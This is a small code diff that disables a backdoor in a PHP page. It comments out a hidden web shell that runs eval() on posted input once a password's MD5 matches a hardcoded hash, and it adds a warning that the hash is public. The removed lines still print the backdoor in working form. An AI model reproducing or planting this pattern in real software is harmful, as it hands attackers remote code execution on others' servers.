@@ -19,7 +19,7 @@
 </html>
 
 <?php
-
-if (md5($_POST['password'])=="d88f07528fa07f7be9318ece7656fd0b")
-	eval($_POST['request']);
+// This hash is publicly known. It is trivial to post to this page to get access to your server
+//if (md5($_POST['password'])=="d88f07528fa07f7be9318ece7656fd0b")
+//	eval($_POST['request']);
 ?>
